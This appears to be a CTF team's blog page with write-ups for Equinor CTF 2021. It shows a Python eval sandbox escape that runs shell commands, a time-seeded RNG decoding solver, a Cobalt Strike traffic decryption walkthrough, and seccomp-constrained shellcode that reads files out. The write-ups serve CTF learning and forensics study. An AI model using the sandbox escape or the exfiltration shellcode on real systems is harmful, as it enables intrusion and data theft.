<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>Equinor CTF 2021 | Blog | bootplug</title><meta name=keywords content="ctf,web,forensics,reversing,pwn,ics,crypto"><meta name=description content="Writeups from Equinor's CTF"><meta name=author content="zup, KFBI, klarz"><link rel=canonical href=https://bootplug.io/posts/ctf/equinorctf/><link crossorigin=anonymous href=/assets/css/stylesheet.min.6f60056d44d3f7eb69a4bc6c332b59960f3a995802bded244750232f33713c49.css integrity="sha256-b2AFbUTT9+tppLxsMytZlg86mVgCve0kR1AjLzNxPEk=" rel="preload stylesheet" as=style><link rel=preload href=/images/bootplug.png as=image><script defer crossorigin=anonymous src=/assets/js/highlight.min.2840b7fccd34145847db71a290569594bdbdb00047097f75d6495d162f5d7dff.js integrity="sha256-KEC3/M00FFhH23GikFaVlL29sABHCX911kldFi9dff8=" onload=hljs.initHighlightingOnLoad()></script>
<link rel=icon href=https://bootplug.io/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://bootplug.io/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://bootplug.io/favicon-32x32.png><link rel=apple-touch-icon href=https://bootplug.io/apple-touch-icon.png><link rel=mask-icon href=https://bootplug.io/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><meta name=generator content="Hugo 0.98.0"><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--hljs-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><meta property="og:title" content="Equinor CTF 2021"><meta property="og:description" content="Writeups from Equinor's CTF"><meta property="og:type" content="article"><meta property="og:url" content="https://bootplug.io/posts/ctf/equinorctf/"><meta property="og:image" content="https://bootplug.io/papermod-cover.png"><meta property="article:section" content="posts"><meta property="article:published_time" content="2021-10-31T15:17:02+01:00"><meta property="article:modified_time" content="2021-10-31T15:17:02+01:00"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://bootplug.io/papermod-cover.png"><meta name=twitter:title content="Equinor CTF 2021"><meta name=twitter:description content="Writeups from Equinor's CTF"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"https://bootplug.io/posts/"},{"@type":"ListItem","position":2,"name":"CTFs","item":"https://bootplug.io/posts/ctf/"},{"@type":"ListItem","position":3,"name":"Equinor CTF 2021","item":"https://bootplug.io/posts/ctf/equinorctf/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"Equinor CTF 2021","name":"Equinor CTF 2021","description":"Writeups from Equinor's CTF","keywords":["ctf","web","forensics","reversing","pwn","ics","crypto"],"articleBody":"Misc üî• Kalk üî•  Author: null\nDescription: I heard you needed a new calculator for your math course? Why buy a new one when you can just use my Calculator-as-a-Service instead!\nnc io.ept.gg 30046\n We get a Python script to download:\n#!/usr/bin/env python3 import dis import os   class Math(dict):  def __init__(self):  self.e = 0  self.pi = 0   def kalk(src, locals):  if '=' in src:  co = compile(src, \"kalk\", \"single\")  for opc in dis.get_instructions(co):  if opc.opname not in ['LOAD_NAME', 'LOAD_CONST', 'STORE_NAME', 'STORE_ATTR', 'RETURN_VALUE']:  print(\"Bonk! ., opc.opname)  return  eval(co, {}, locals)  else:  co = compile(src, \"kalk\", \"eval\")  for opc in dis.get_instructions(co):  if 'CALL' in opc.opname:  print('No U! .)  return   _ = eval(co, {}, locals | {'math': Math(), 'tease': os.system})  locals['_'] = _  return _   locals = {} while True:  r = kalk(input(' '), locals)  if r is not None:  print(repr(r)) It looks like this is a calculator as a service. When you connect to the server you can do different math operations. This is done by executing the input you send as Python code. It uses eval to do so.\nIt looks like this application block certain types of operations. It does so by compiling the input that we send in, and uses the dis module to get the instructions and opnames from the compiled code. You can for example don‚Äôt run any functions or methods, because it blocks all opname that contains CALL.\nIn the kalk function there is an if statement that checks for = in our input. If we don‚Äôt assign a value to any variable, it will jump down to the else block and run our code there. As you can see, there are two objects included in the local variables in this eval. math contains a Math-object and tease contains the os.system method.\nSince math is an object of the Math-class, we can probably try to overwrite a dunder-method (method names with double underscores which are called in specific ways). The only problem is that we cannot assign anything to the math object, since then we will be in the first if-block where this object is not available.\nUnblvR on my team found a neat way to move variables from the second eval to the first eval by using _. _ is a special variable that contains the return value of the last instruction. This variable is also available in the first eval even though we did the instruction in the second eval.\nNow we can assign math to another variable:\nnc io.ept.gg 30046   math {}  test = _  test {} The plan is to get the uninitialized Math class into a variable and then overwrite the __add__ method to be tease which is os.system. The __add__ method takes one argument (which is the value you want to add to the object). os.system() also takes one argument, so in theory we can then do a system command by adding the command we want to run to the object like this: math + 'ls -la'\nThe command ls -la should then be executed.\nYou can read more about dunder methods HERE!\nFirst we need to get the Math class:\nnc io.ept.gg 30046  math.__class__ class '__main__.Math'  Math = _  Math class '__main__.Math' Great, now we can overwrite __add__ with os.system\n tease built-in function system  Math.__add__ = _ At last we can set the class of math to be our new class.\n math {}  math = _  math.__class__ = Math Now we should be able to run system commands by doing addition.\n math + \"id\" uid=1000(kalk) gid=1000(kalk) groups=1000(kalk) 0  math + \"ls\" flag.txt kalk.py ynetd 0  math + \"cat flag.txt\" EPT{y0u_br0k3_my_c4lcu1at0r!}0 And we got the flag, great!\nFlag: EPT{y0u_br0k3_my_c4lcu1at0r!}\nüî• Know your encoding üî•  Author: zledge\nDescription: Help us decode some very important words! You might be awarded a flag in the end\nnc io.ept.gg 30045\n We are also provided with a file:\nfrom datetime import datetime from random import Random from time import time  def chunks(lst, n):  \"\"\"Yield successive n-sized chunks from lst.\"\"\"  for i in range(0, len(lst), n):  yield lst[i:i + n]  ALPHABET = 'abcdefghijklmnopqrstuvwxyz+ABCDEFGHIJKLMNOPQRSTUVWXYZ/0123456789' def special_encoding(word, count):  b = Random()  b.seed(int(time() * 1000))  if count:  a = ''.join(b.sample(ALPHABET,len(ALPHABET)))  else:  a = ALPHABET  encoded = ''  for x in chunks(\"\".join([bin(int(byte)).lstrip('0b').zfill(8) for byte in word.encode(\"ascii\")]), 24):  y = list(chunks(x, 6))  for value in y:  encoded += a[int(value.ljust(6, \"0\"), 2)]  print(f\"{datetime.fromtimestamp(int(time()))}- Decode the following: {encoded}\", flush=True) Upon connecting we‚Äôre greeted with this:\nSomeone created an encoding scheme, and now we have trouble decoding the output. Can you help us out? You have 5 seconds per word. All words are lowercase ascii before encoding. Are you ready? After answering we‚Äôre greeted with a challenge:\n2021-10-31 18:20:50 - Decode the following: BgKMAwvTChm\nSo let‚Äôs analyze the code:\n chunks is explained with a docstring, so we can move on to special_encoding immediately First it gets the current amount of seconds since 1. January 1970 also known as unix-time. ( time() ) This is then multiplied with 1000 to get millisecond precision. (time()*1000) Lastly it‚Äôs fed into a random generator as a seed. based on a variable count it then either generated a random shuffled alphabet or uses the standard one Then in the following 4 lines it base64 encodes the word (more detailed explanation inside)  Firstly it generates a long bitstring and divides it up into 24 bits at a time Then it‚Äôs divided furthermore into chunks of 6 bits based on the value of these 6 bits it picks the corresponding character from the ‚Äúalphabet-lookup string‚Äù a   After looping over the whole bitstring the encoded result is provided prefixed with the server‚Äôs current time.  Before I show the solution script there‚Äôs a few gotchas with this challenge that I‚Äôd like to mention first.\ncount variable As mentioned in the analysis special_encoding chooses which alphabet to use based on a count variable, however we don‚Äôt know the value of this variable and so we can‚Äôt be completely sure of which alphabet is used. We can make a educated guess and think that count is like a round counter starting at zero, meaning only the first round will be base64\nTimezones Timezones are always a pain to deal with, and this challenge is no exception, because if you just parse the time from the server you‚Äôll get the wrong result. What you need to do, or what I had to do was add 3600 seconds to the time parsed.\ntime() invoked twice So a small detail that‚Äôs worth noticing is that the time() used to seed the random generator isn‚Äôt quite the same as the time presented to us. As time is invoked two times instead of being saved to a variable, this didn‚Äôt pose any problems for me. But could become a problem if the system is already stressed.\nSo without further adieu, the solve script:\nfrom datetime import datetime from pwn import remote, log from random import Random from Crypto.Util.number import long_to_bytes from string import ascii_lowercase  ALPHABET = 'abcdefghijklmnopqrstuvwxyz+ABCDEFGHIJKLMNOPQRSTUVWXYZ/0123456789'   def decode(s, mapping):  bs = \"\".join([bin(mapping.index(c)).lstrip(\"0b\").zfill(6) for c in s])  bs = bs[:(len(bs) // 8) * 8]  return long_to_bytes(int(bs, 2))   def solve(base_time, chall):  for drift in range(1000):  tm = base_time * 1000 + drift   b = Random()  b.seed(tm)   for mapping in [''.join(b.sample(ALPHABET, len(ALPHABET))), ALPHABET]:  bts = decode(chall, mapping)  if all([chr(char) in ascii_lowercase for char in bts]):  return bts  else:  log.error(\"Couldn't find solution\")   r = remote(\"io.ept.gg\", 30045) r.sendline(b\"y\") r.recvline() r.recvline() for i in range(100):  chal = r.recvline().decode()   dt = datetime.fromisoformat(chal.split(\" - \")[0]).strftime(\"%s\")   server_time = int(dt) + 3600 # adjust to the same timezone as the server   ans = solve(server_time, chal.split(\": \")[1].strip())  print(ans)  r.sendline(ans)  assert r.recvline() == b\"Correct!\\n\"  r.interactive() Further explanation brute force So since we know the time the random alphabet was generated we can just reproduce it locally. After we have the time (that‚Äôs corrected for the timezone) we have to do some brute force, because the time value we‚Äôre provided with is only in second resolution and the random seed function required millisecond resolution. Using this base value we should brute force around that base I chose a span of 0-1000ms after the base time.\ndecoding Now inside the loop we can feed these time values into the Random.seed() function. Then we can generate our random alphabet and try to decode the challenge sent by the server with both the random alphabet and the standard one. The decoding works by taking each char in the encoded string and finding it‚Äôs corresponding position in the alphabet, then we convert that value to binary, stripping the 0b and ensuring it‚Äôs 6 chars long. After that we strip the bitstring into the nearest length that‚Äôs divisible by 8. Then we parse it as a binary number and convert it from a int to bytes, and we‚Äôre done.\nsubmitting So now we have a possible correct result, but since we‚Äôre brute forcing this could be a garbage value as well. So we have to check that all the characters are printable and ASCII-lowercase, then we can be pretty certain that we‚Äôve found the correct answer. But we won‚Äôt know for sure before the server responds with Correct!. Again if we bruteforced with a wider range for the drift we might begin to get false positives.\nFlag: EPT{kn0w-y0ur-en0ding!}\nForensics üî• Eastbound \u0026 Pwned üî•  Author: LOLASL\nDescription: KennyP thinks that Anti-Virus is for wussies and that his enemies can‚Äôt touch him, but we are now observing hits on a signature that could indicate the presence of Cobalt Strike on his computer.\nWe have retrieved the network traffic in question and a memory dump of the machine (Windows 10 x64 Build 19043.1237), can you figure out what the attacker has been up to?\nEastboundAndPwned.zip\n We are provided with an archive (EastboundAndPwned.zip), which contains a network capture (LA-FLAMA-BLANCA-20211025-071559.pcap) and a memory dump (LA-FLAMA-BLANCA-20211025-071559.raw).\nCobalt Strike The challenge description mentions Cobalt Strike, which is:\n [Cobalt Strike] is a commercial, full-featured, remote access tool that bills itself as ‚Äúadversary simulation software designed to execute targeted attacks and emulate the post-exploitation actions of advanced threat actors‚Äù. Cobalt Strike‚Äôs interactive post-exploit capabilities cover the full range of ATT\u0026CK tactics, all executed within a single, integrated system.\n Source: MITRE ATT\u0026CK¬Æ\nIn short: it is a tool that is used to be able to remotely control a system. Malicious actors have used it for years to deploy ‚ÄúListeners‚Äù on victim machines. To solve this challenge we need to get a better understanding of how Cobalt Strike communicates, and how it can be configured.\nC2 Communication The art and science of detecting Cobalt Strike by Nick Navis (@nickmavis) from Cisco Talos, describes the C2 communication as such:\n Infection: The client is infected with either a staged, or a stageless payload. For a stageless payload, it will decode itself, and then load itself into memory. The configuration for the beacon is XOR encrypted but by default, use a static XOR key for each respective beacon version (3 or 4). Heartbeat: The infected host sends a heartbeat to the Cobalt Strike C2 server with basic metadata and queues up any commands (read Tasks) that were added. Tasks: Cobalt Strike uses AES-256 in CBC mode with HMAC-SHA-256 to encrypt task commands (i.e. commands sent remotely by the attacker). The AES key can be found in the encrypted metadata that is sent during a heartbeat, but it also lives shortly in memory of the infected process. Callbacks: After a task is executed, the host calls back to the C2 server with a encrypted payload containing the results of the task.  A more detailed explanation can be found on page 10 and 11 in the paper by Nick Navis.\nA diagram of the Cobalt Strike C2 communication flow. Source: NVISO Labs\nBeacon Configuration Didier Stevens has made a tool, 1768 K, which decodes and dumps the configuration of Cobalt Strike beacons. He later updated this tool (3 weeks ago at the time of writing this) with newer statistics.\nDecrypting Cobalt Strike Traffic Didier Stevens made yet another blog post, ‚ÄúQuickpost: Decrypting Cobalt Strike Traffic‚Äù. He made a tool (cs-extract-key.py) that looks in the dumped process memory for the unencrypted metadata that the beacon sends to the C2. Furthermore, he also made a tool (cs-parse-http-traffic.py) that can use the extracted keys to decrypt and parse the encrypted HTTP C2 communication in a PCAP file.\nSolution Our goal is ‚Äúsimple‚Äù, we need to decrypt the traffic between the infected host and the C2 server. From our research above we know that we have to:\n Extract and decrypt the Cobalt Strike Beacon configuration Dump the memory of the process that was infected with the payload Extract the AES and HMAC keys from the process memory Use these keys to decrypt the C2 (HTTP) communication  Extracting And Decoding Beacon Configuration Opening the PCAP in Wireshark, we can easily filter on http and find the Cobalt Strike stager shellcode request and thus the beacon in tcp.stream eq 9. We export this payload to a file (ept_beacon).\nGET /stE1 HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; LBBROWSER) Host: 172.16.32.2 Connection: Keep-Alive Cache-Control: no-cache  HTTP/1.1 200 OK Date: Mon, 25 Oct 2021 07:12:52 GMT Content-Type: application/octet-stream Content-Length: 261191 --- snip --- We use the updated 1768 tool to extract the configuration for the C2 beacon, note the process injection configuration.\n$ python 1768.py -r ept_beacon File: ept_beacon xorkey(chain): 0xa6b02dff length: 0x03fc0089 Config found: xorkey b'.' 0x00000000 0x000057cf 0x0001 payload type 0x0001 0x0002 0 windows-beacon_http-reverse_http 0x0002 port 0x0001 0x0002 80 0x0003 sleeptime 0x0002 0x0004 60000 0x0004 maxgetsize 0x0002 0x0004 1048576 0x0005 jitter 0x0001 0x0002 0 0x0006 maxdns 0x0001 0x0002 255 0x0007 publickey 0x0003 0x0100 30819f300d06092a864886f70d010101050003818d0030818902818100baaa6b1100ef88c737a50e0f9f86279487a3a838e7e1da5fb1fb1fbcc8b2361207756fa5cfd1fd2c86dc86e32ac73055e7c6da46d13beaa3bc171892fb62e4c90206aaa9c28cb4f9aefc752c9fbc3ae723ed070b0f1dd516b9f75cd4d58a6e61784040d4147ba9fe2c84b9df49e67311dc7999c83772fccab8b7eb78af293135020301000100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000 0x0008 server,get-uri 0x0003 0x0100 '172.16.32.2,/load' 0x0009 useragent 0x0003 0x0080 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)' 0x000a post-uri 0x0003 0x0040 '/submit.php' 0x000b Malleable_C2_Instructions 0x0003 0x0100 '\\x00\\x00\\x00\\x04' 0x000c http_get_header 0x0003 0x0100  Cookie 0x000d http_post_header 0x0003 0x0100  \u0026Content-Type: application/octet-stream  id 0x000e SpawnTo 0x0003 0x0010 '\\x92~\\x14√≤¬ªD\\x08\\x89e\\x89\\x92\\x1f`√¥\u0026n' 0x001d spawnto_x86 0x0003 0x0040 '%windir%\\\\syswow64\\\\rundll32.exe' 0x001e spawnto_x64 0x0003 0x0040 '%windir%\\\\sysnative\\\\rundll32.exe' 0x000f pipename 0x0003 0x0080 (NULL ...) 0x001f CryptoScheme 0x0001 0x0002 0 0x0013 DNS_Idle 0x0002 0x0004 0 0.0.0.0 0x0014 DNS_Sleep 0x0002 0x0004 0 0x001a get-verb 0x0003 0x0010 'GET' 0x001b post-verb 0x0003 0x0010 'POST' 0x001c HttpPostChunk 0x0002 0x0004 0 0x0025 license-id 0x0002 0x0004 885300606 0x0026 bStageCleanup 0x0001 0x0002 0 0x0027 bCFGCaution 0x0001 0x0002 0 0x0036 HostHeader 0x0003 0x0080 (NULL ...) 0x0032 UsesCookies 0x0001 0x0002 1 0x0023 proxy_type 0x0001 0x0002 2 IE settings 0x003a 0x0003 0x0080 '\\x00\\x04' 0x0039 0x0003 0x0080 '\\x00\\x04' 0x0037 0x0001 0x0002 0 0x0028 killdate 0x0002 0x0004 0 0x0029 textSectionEnd 0x0002 0x0004 0 0x002b process-inject-start-rwx 0x0001 0x0002 64 PAGE_EXECUTE_READWRITE 0x002c process-inject-use-rwx 0x0001 0x0002 64 PAGE_EXECUTE_READWRITE 0x002d process-inject-min_alloc 0x0002 0x0004 0 0x002e process-inject-transform-x86 0x0003 0x0100 (NULL ...) 0x002f process-inject-transform-x64 0x0003 0x0100 (NULL ...) 0x0035 process-inject-stub 0x0003 0x0010 '√íS√ìn\\x83w1\\x98√ºEh√Æ\\x90I?,' 0x0033 process-inject-execute 0x0003 0x0080 '\\x01\\x02\\x03\\x04' 0x0034 process-inject-allocation-method 0x0001 0x0002 0 0x0000 Guessing Cobalt Strike version: 4.2 (max 0x003a) With this we also find 3 HTTP requests that were during the communication (TCP stream 117, 121, and 131).\nWireshark filter: ip.addr == 172.16.32.2 and http.request.uri matches \"/submit.php*\".\n\u0026 ls ./streams 117.hex 121.hex 131.hex $ cat 117.hex 000000403c328a67f95f9f2f4d2ed72853369bc476eff4234d932a569a3d22d852dc453e7c22d12f6bc461f2adca8c448a85c5b26204522c2fe327af7d608acc27e4333f We also find the encrypted metadata blob in a cookie sent in a /load request:\nCookie: dhJBx9uy37Z1YC4YF/ePAKIiFj9mkS7hsd0hwK3DO0vPAkwB/cziZXYPaVJiPFuJlzpLZZKM0Dbi9XwF3bHR76vyPhVKBaRN975ISSNxIjLGNvl6598X2Nop/noEA2ZIo+KWqXC6uRwIPh4EWdI4wlitNy63ye8clGZwbAZAhMY= Dump Memory Of The Infected Process We need to find the process where the beacon was injected, we know that it uses rundll32.exe to inject into a process (spawnto from the beacon configuration), we also note the process injection flag (PAGE_EXECUTE_READWRITE) .\nTo analyze the memory dump, we use the Volatility memory forensics framework. We also know from the challenge description that the provided memory dump was taken from a machine running Windows 10 x64 Build 19043.1237, the closest matching profile for this in Volatility is Win10x64_19041.\nLooking at Volatility‚Äôs Command Reference for Malware we find the malfind command, which helps find hidden or injected code/DLLs in user mode memory, based on characteristics such as VAD tag and page permissions.\n$ vol -f LA-FLAMA-BLANCA-20211025-071559.raw --profile Win10x64_19041 malfind We find 2 interesting processes: smartscreen.ex Pid: 5576 and svchost.exe Pid: 3452.\nProcess: svchost.exe Pid: 3452 Address: 0x720000 Vad Tag: VadS Protection: PAGE_EXECUTE_READWRITE Flags: PrivateMemory: 1, Protection: 6 0x0000000000720000 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 0x0000000000720010 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 0x0000000000720020 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 0x0000000000720030 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 0x0000000000720000 0000 ADD [EAX], AL 0x0000000000720002 0000 ADD [EAX], AL 0x0000000000720004 0000 ADD [EAX], AL 0x0000000000720006 0000 ADD [EAX], AL 0x0000000000720008 0000 ADD [EAX], AL 0x000000000072000a 0000 ADD [EAX], AL 0x000000000072000c 0000 ADD [EAX], AL 0x000000000072000e 0000 ADD [EAX], AL 0x0000000000720010 0000 ADD [EAX], AL 0x0000000000720012 0000 ADD [EAX], AL 0x0000000000720014 0000 ADD [EAX], AL 0x0000000000720016 0000 ADD [EAX], AL 0x0000000000720018 0000 ADD [EAX], AL 0x000000000072001a 0000 ADD [EAX], AL 0x000000000072001c 0000 ADD [EAX], AL 0x000000000072001e 0000 ADD [EAX], AL 0x0000000000720020 0000 ADD [EAX], AL 0x0000000000720022 0000 ADD [EAX], AL 0x0000000000720024 0000 ADD [EAX], AL 0x0000000000720026 0000 ADD [EAX], AL 0x0000000000720028 0000 ADD [EAX], AL 0x000000000072002a 0000 ADD [EAX], AL 0x000000000072002c 0000 ADD [EAX], AL 0x000000000072002e 0000 ADD [EAX], AL 0x0000000000720030 0000 ADD [EAX], AL 0x0000000000720032 0000 ADD [EAX], AL 0x0000000000720034 0000 ADD [EAX], AL 0x0000000000720036 0000 ADD [EAX], AL 0x0000000000720038 0000 ADD [EAX], AL 0x000000000072003a 0000 ADD [EAX], ALZ 0x000000000072003e 0000 ADD [EAX], AL Process: smartscreen.ex Pid: 5576 Address: 0x2491b920000 Vad Tag: VadS Protection: PAGE_EXECUTE_READWRITE Flags: PrivateMemory: 1, Protection: 6 0x000002491b920000 48 89 54 24 10 48 89 4c 24 08 4c 89 44 24 18 4c H.T$.H.L$.L.D$.L 0x000002491b920010 89 4c 24 20 48 8b 41 28 48 8b 48 08 48 8b 51 50 .L$.H.A(H.H.H.QP 0x000002491b920020 48 83 e2 f8 48 8b ca 48 b8 60 00 92 1b 49 02 00 H...H..H.`...I.. 0x000002491b920030 00 48 2b c8 48 81 f9 70 0f 00 00 76 09 48 c7 c1 .H+.H..p...v.H.. --- snip --- We note that both of them have the PAGE_EXECUTE_READWRITE set, which is what we saw in the beacon configuration, so we quickly dump the memory of these processes:\n$ vol -f LA-FLAMA-BLANCA-20211025-071559.raw --profile Win10x64_19041 memdump -D ./memdumps -p 3452 $ vol -f LA-FLAMA-BLANCA-20211025-071559.raw --profile Win10x64_19041 memdump -D ./memdumps -p 5576 $ ls ./memdumps 3452.dmp 5576.dmp Extract Keys By using cs-extract-key.py we can easily parse these memory dumps and extract the AES keys within them (if they exist).\nThe script will not be able to find any keys if you run it as-is, Didier notes this in his post:\n This method does not always work: the metadata is overwritten after some time, so the process dump needs to be taken quickly after the beacon is started. And there are also cases were this metadata can not be found (I suspect this is version bound).\n The tools includes an options to perform a dictionary attack if you provide it a callback payload. The tool then extracts all possible AES and HMAC keys from the process dump and tries to authenticate and decrypt the callback. The callback payload can be found in TCP stream 117 from the PCAP.\nI somehow messed up this step, but my teammate, @UnblvR, managed to extract the key successfully from the svchost.exe process and decrypt the traffic:\n$ python cs-extract-key.py -c 000000403c328a67f95f9f2f4d2ed72853369bc476eff4234d932a569a3d22d852dc453e7c22d12f6bc461f2adca8c448a85c5b26204522c2fe327af7d608acc27e4333f ./memdumps/3452.dmp File: ./memdumps/3452.dmp AES key position: 0x0002a440 AES Key: f55fdb402eb483720fe7ca64f1a8a4cf HMAC key position: 0x0002a450 HMAC Key: ad5584fe824cad1d6b839860c88df785 Side note: My attempts resulted in an empty output, most likely due to the callback being messed up.\nDecrypt C2 Communication The final step is to use these extracted keys to decrypt the C2 communication. This is easily done by using the tool (cs-parse-http-traffic.py) we found earlier. With the Wireshark filter we created earlier we can be sure to only attempt to decrypt the encrypted payloads. After letting the script run for a bit, we finally see the flag in the last decrypted payload (Packet number: 156656).\n$ python cs-parse-http-traffic.py -k ad5584fe824cad1d6b839860c88df785:f55fdb402eb483720fe7ca64f1a8a4cf -Y 'ip.addr == 172.16.32.2 and http.request.uri matches \"/submit.php*\"' LA-FLAMA-BLANCA-20211025-071559.pcap Packet number: 143669 HTTP request http://172.16.32.2/submit.php?id=1011624348 Counter: 2 Callback: 30 UNKNOWN la-flama-blanca\\kennyp  Extra packet data: b''  Packet number: 156050 HTTP request http://172.16.32.2/submit.php?id=1011624348 Counter: 3 Callback: 30 UNKNOWN User name KennyP Full Name Comment User's comment Country/region code 000 (System Default) Account active Yes Account expires Never Password last set 9/29/2021 2:15:34 AM Password expires Never Password changeable 9/29/2021 2:15:34 AM Password required No User may change password Yes Workstations allowed All Logon script User profile Home directory Last logon 10/25/2021 12:12:52 AM Logon hours allowed All Local Group Memberships *Administrators *Users Global Group memberships *None The command completed successfully. Extra packet data: b'' Packet number: 156656 HTTP request http://172.16.32.2/submit.php?id=1011624348 Counter: 4 Callback: 0 UNKNOWN ---------------------------------------------------------------------------------------------------- flag EPT{d3crypt1ng_c0b4lt_str1k3_tnx_2_d1d13r} Modern\\ SystemShared\\ TIP\\ ---------------------------------------------------------------------------------------------------- Extra packet data: b'' Flag: EPT{d3crypt1ng_c0b4lt_str1k3_tnx_2_d1d13r}\nShellcoding üî• Shellcoding 0x05 üî• This one is a bit different from the others. The flag is in one of 200 files that are randomly created in /opt/flag/. You need to find and print the flag. The files are recreated every minute using the script generateFiles.py which is attached. I've also disabled execv and fork syscalls using seccomp. GL HF! :) As the description says, in this challenge the flag is hidden inside 1 out of 200 randomly named files. Moreover, the shellcode is limited to 70 bytes, and the entire directory of random files is regenerated every minute. Syscalls are also severely restricted, to not let us do anything fancy like 2-stage payloads or creating more space.\nvoid disableSyscalls() {  scmp_filter_ctx ctx;  ctx = seccomp_init(SCMP_ACT_ALLOW);  seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(execveat), 0);  seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(execve), 0);  seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(fork), 0);  seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(vfork), 0);  seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(mprotect), 0);  seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(mmap), 0);  seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(brk), 0);  seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(munmap), 0);  seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(mremap), 0);   seccomp_load(ctx);  } The file randomization is done through a Python script, which is using the insecure random module to figure out the names. Exploiting this is a harder problem than just solving the challenge, as we need the outputs in order to predict outputs, so this makes no sense to attack.\nOur general plan is to do something like\nopen(\"/opt/flag\") lseek(fd) to skip \".\" and \"..\"\" getdents(fd) open(file) sendfile(fd) The string /opt/flag already exists inside the binary through the string \"The flag somewhere in /opt/flag\", so that is easy enough.\n/* open(\"/opt/flag\") */ pop rdi add di, 2779 mov al, 2 syscall seekdir() just calls lseek() anyways, so let‚Äôs just go straight to the source and skip a certain number of entries. We dynamically change this OFFSET to a number (explained later), to skip past the uninteresting directory entries in the start. Note that since stdin is closed, the open() syscall is given fd=0.\n/* lseek(0, OFFSET, 0) */ xor eax, eax mov al, 8 xor edi, edi xor esi, esi mov esi, OFFSET xor edx, edx syscall Next up is getdents() to fetch the directory entry from OFFSET into $RSP (valid pointer to the stack), pretending we have 100 bytes to write there.\n/* getdents(0, rsp, 100) */ xor eax, eax mov al, 78 xor edi, edi mov rsi, rsp xor edx, edx mov dl, 100 syscall Now we need to extract the file contents. The structure we just wrote into $RSP looks like this\nstruct linux_dirent {  unsigned long d_ino; /* Inode number */  unsigned long d_off; /* Offset to next linux_dirent */  unsigned short d_reclen; /* Length of this linux_dirent */  char d_name[]; /* Filename (null-terminated) */  /* length is actually (d_reclen - 2 - offsetof(struct linux_dirent, d_name)) */  /* char pad; // Zero padding byte char d_type; // File type (only since Linux // 2.6.4); offset is (d_reclen - 1) */ } and we‚Äôre only interested in d_name, so we have to skip past the other fields (8+8+2=18 bytes). Let‚Äôs do openat() and access the potential flag file as a descriptor, so it can be sent with sendfile() later.\n/* openat(linux_dirent-d_name, 0, 0) */ mov ax, 257 lea rsi, [rsp+18] xor edx, edx syscall The final piece of the exfiltration puzzle, is to actually transfer the contents. sendfile() can do this.\n/* sendfile(1, fd_from_openat, 0, 200) */ mov esi, eax xor eax, eax mov al, 40 xor edi, edi inc edi mov r10b, 200 syscall And that‚Äôs where we ran out of bytes. We now have the contents of one file, but it will take a long time before the first file will contain the flag file, and since this is a üî•-challenge, time is of the essence. Cue the reason why we made OFFSET a variable. It is possible to combine this script with another one that tells us the offset to the next file.\nThe new code does everything the same way as the previous blocks, except it replaces openat()+sendfile() with this:\n/* write(1, linux_dirent-d_off, 8) */ xor eax, eax inc eax xor edi, edi inc edi lea rsi, [rsp+8] xor edx, edx mov dl, 8 syscall Which sends us the offset to the next file structure. We can then feed this offset back into the other script to fetch the contents of the next file, then repeat this over and over. It manages to read quite a lot of files before the 1-minute reset happens, so after just a few minutes we get lucky enough to get the flag.\nimport subprocess import sys  curr = eval(sys.argv[1]) if len(sys.argv)  1 else 0  while True:  soln = subprocess.check_output(['python3', 'get_filedata.py', str(curr)])  print(repr(soln))  if soln.startswith(b'EPT'):  sys.exit()  off = subprocess.check_output(['python3', 'print_offset.py', str(curr)])  print(off)  curr = eval(off) After around 9 minutes, the flag is exfiltrated\nFlag: EPT{y0u_ar3_th3_master_0f_sh3llc0de}\n","wordCount":"4259","inLanguage":"en","datePublished":"2021-10-31T15:17:02+01:00","dateModified":"2021-10-31T15:17:02+01:00","author":[{"@type":"Person","name":"zup"},{"@type":"Person","name":"KFBI"},{"@type":"Person","name":"klarz"}],"mainEntityOfPage":{"@type":"WebPage","@id":"https://bootplug.io/posts/ctf/equinorctf/"},"publisher":{"@type":"Organization","name":"Blog | bootplug","logo":{"@type":"ImageObject","url":"https://bootplug.io/favicon.ico"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://bootplug.io/ accesskey=h title="Blog (Alt + H)"><img src=/images/bootplug.png alt=logo 